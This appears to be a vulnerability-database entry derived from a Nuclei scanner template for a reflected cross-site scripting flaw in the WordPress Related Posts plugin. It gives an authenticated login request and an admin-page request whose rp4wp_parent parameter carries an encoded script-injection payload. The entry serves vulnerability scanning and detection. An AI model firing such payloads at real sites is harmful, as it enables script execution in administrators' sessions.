# Vulnerability: WordPress Related Posts <= 2.1.1 - Cross Site Scripting
**Classification:** WP-PLUGIN
**Source:** Nuclei Template (`wp-related-post-xss.yaml`)

## Description
WordPress Related Posts plugin before 2.1.1 contains an Reflected XSS via rp4wp_parent

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: {{Hostname}}
```

